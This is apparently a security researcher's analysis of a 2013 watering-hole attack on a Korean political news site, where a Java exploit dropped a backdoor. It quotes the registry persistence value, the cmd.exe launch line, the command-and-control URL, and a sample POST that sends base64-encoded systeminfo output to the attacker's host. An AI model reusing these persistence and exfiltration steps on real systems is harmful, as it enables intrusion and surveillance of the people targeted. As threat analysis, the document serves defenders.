@@ -1,0 +1,72 @@
+While researching PlugX propagation with the use of Java exploits we stumbled upon one compromised site that hosted and pushed a malicious Java applet exploiting the CVE 2013-0422 vulnerability.
+The very malicious Java application was detected heuristically with generic verdict for that vulnerability and it would have been hardly possible to spot that particular site between tons of other places where various malicious Java applications were detected with that generic verdict.
+But it was a very specific search conducted back then and this site appeared in statistics among not so many search results.
+Well, to be honest it was a false positive in terms of search criteria, but in this case it was a lucky mistake.
+The infectious website was an Internet resource named – minjok.com and it turned out to be a news site in Korean and English languages covering mostly political events around the Korean peninsula.
+We notified an editor of this site about the compromise and although he has not responded, the site got closed after a while.
+This is how minjok.com is described at http://www.northkoreatech.org/the-north-korean-website-list/minjok-tongshin/:
+Description of minjok.com
+The editor of the Minjok-Tongshin is a Korean American named “Ken Kilnam Roh” who, by all appearances, lives in California.
+This man is struggling for the reunification of the two Koreas, and wants to see all Koreans being united and happy as one nation should live.
+Well, unfortunately there is no simple solution to satisfy all sides and of course all involved parties keep an eye on what’s happening along this direction.
+You can imagine what the subjects are covered on the said news site and what sort of people are interested in reading such articles – themes are delicate and the audience consists of rather politically active Koreans.
+And this site is well fitted for carrying out a watering hole attack if you’d wish to learn what Korean activists think or maybe even intend to do regarding not simple situation between North and South Koreas.
+And exactly this has been done by some interested party.
+The site had been compromised and attackers added a single line in a page code displaying the hottest news about Korea.
+Injected malicious applet
+This line of code forced a visitor’s browser to download and execute the malicious Java applet residing in the very site.
+In case of successful exploitation, a malicious executable was downloaded to the victim and run without any user interaction.
+The executable was located on this compromised site as well, disguising its file name as if it was a GIF image.
+The executable file is a malicious program which acts as a simple dropper and installer for the next attack stage.
+It first creates the “%systemdrive%:Temp” folder and saves therein a file named “agentm.exe”.
+It also creates a following registry value:
+HKCUSoftwareMicrosoftWindowsCurrentVersionRun bspire = “%systemdrive%:Tempagentm.exe BSPIRE”
+to ensure the next malware stage “agentm.exe” runs every time when operating system starts up.
+And of course, the “agentm.exe” is launched immediately after installation with the use of executing following command:
+cmd.exe /c dir c:windows & cmd.exe /c for /f %a in (‘dir /a /s /b %systemdrive%tempagentm.exe’) do (%a BSPIRE)
+Infection process
+Agentm.exe is a backdoor which connects to the following C&C: mailsgoogle.com.
+The C&C is currently pointing to the IP-address 146.0.79.133 in the Netherlands, but this is a dedicated server offered for renting by Russian telecommunications firm Hostkey.
+The C&C domain mailsgoogle.com was registered in December of 2012 with an email-address richard.blosser@aol.com:
+mailsgoogle.com registration data
+To work as it was intended the backdoor must be run with argument “BSPIRE”.
+If the program gets executed without the right argument it calculates the following process names to search between running processes:
+XxXlorer.exe in case of absence of arguments; explXXer.eXe in case if an argument does exist but it is not “BSPIER”;
+If the argument is “BSPIRE”, it generates the process name “explorer.exe”, to which it injects itself.
+Some noteworthy mark of this malware is that it forms text strings byte-by-byte along its whole extent:
+Constructing strings by characters
+This isn’t an extremely rare technique but this malware uses it as well and in a quite excessive manner – obviously, for obfuscation reasons.
+Once “explorer.exe” has been found in memory, the agent injects a part of itself into that process and remotely starts a thread of its code in the context of “explorer.exe”.
+This thread performs all the main tasks of the malware.
+Despite the fact that the malware is set to be executed only once when the operation system starts up, after the malware has been injected into “explorer.exe” it creates a mutex after the name WIN32_BLACKSPIRE_02 to avoid running multiple instances at the same time.
+The backdoor connects to the C&C by HTTP GET requests:
+mailsgoogle.com/bbs/board.php?bincode=
+The encoded string contains the date and time when the initial agent is executed, for example: [2013-04-15 13h00m00s334].
+This data along with URL to connect to the C&C are kept in a file “%systemdrive%Temppassing.dat” saved by the initial agent.
+This file is further read by injected code from “explorer.exe” hence allowing the malware author to implement a data transport between different components of the malware.
+The backdoor is pretty simple: it is able to perform just two actions by commands from the C&C – to download for execution a Dynamic Link Library and to uninstall itself.
+If a DLL has been pushed by the C&C, the backdoor saves it after the name “winnt32x.dll” in system temp folder, then loads it by LoadLibraryA and invokes a library’s export function run.
+When the run function has completely worked out, the library is unloaded and the file “winnt32x.dll” is removed.
+The C&C doesn’t send additional libraries to an infected machine instantly; attackers push them when they explore what the computer has been netted.
+This reflects the targeted nature of the attack.
+During our investigation, we observed that after a while the attackers uploaded two types of libraries.
+Several libraries of the first type were just wrappers for the dir command on infected computer with different paths for showing locations content hardcoded right in the body of DLLs.
+The second type was an executor of another command line utility: systeminfo.
+These libraries direct commands output to the created file containing date and time of execution in its file name, for example: [2013-04-16 11H01M19S000]_TYPE02 in system temporary folder.
+Then the output is read from this file and sent to the C&C in encoded with BASE64 form.
+An example of such a sending looks like this:
+POST /bbs/board.php?bincode=WzIwMTMtMDQtMTUgMTRoMDVtMzZzNTcxXQ==&opcode=true&rscode=WzIwMTMtMDQtMTYgMDRoMDRtMDRzNjA5XV90eXBlMDI= HTTP/1.1 Content-Type: multipart/form-data, boundary=mm1777multi3333headr Host: mailsgoogle.com Content-Length: 838 Connection: Keep-Alive
+–mm1777multi3333headr Content-Disposition: form-data; name=”file”; filename=WzIwMTMtMDQtMTYgMDRoMDRtMDRzNjA5XV90eXBlMDI=
+//4gAFYAb [snip] AA0ACgA= –mm1777multi3333headr-
+In total the attackers uploaded 4 libraries to execute following commands: cmd /c dir %appdata% cmd /c dir c: cmd /c dir d: cmd /c systeminfo
+Having figured out that the operating system does not seem to belong to some valuable person (after all it was a test virtual machine with minimum resources) the miscreants lost interest and did nothing since then.
+We detect discribed malware with following verdicts: Java app: javaupdates.jar (0x9d8e935ef2c509ea30df1bd88127cc34) – Exploit.Java.CVE-2013-0422.z Dropper: images.gif (0xcd2690c325e9ca17cd99ba6b76a9fa25) – Backdoor.Win32.Agent.dboe Agent: agentm.exe (0xaaf79582e81e4fdc340865650d9c74a6) – Backdoor.Win32.Agent.dboe
+Interestingly the same exploit with the executable payload have been spotted hosting at forum.beijingshots.com.
+For example, one forum’s section describes itself as a platform of free talk; another one is destined to human rights.
+In general this is a place on the Web where discussions of different aspects including political ones but in this case around China are boiling up.
+We strongly recommend against visiting this resource since it has been still infected.
+According to our statistics, few users have touched these resources with malicious content, most of them from US, Peru, Thailand and Germany.
+Taking into account how the attackers acted we are confident that these are watering hole attacks against Korean and Chinese activists.
+At the moment, we don’t have enough data to pinpoint who is behind these attacks.
+And this is likely only a part of more wide-ranging campaign.
+Well, whoever they are and what the scope of attacks, all the people who regularly visit news sites where Korean political events are covered (as well as Chinese activists) should be cautious – they are a subject of interest of some party and the hunt is on with the use of nasty things.
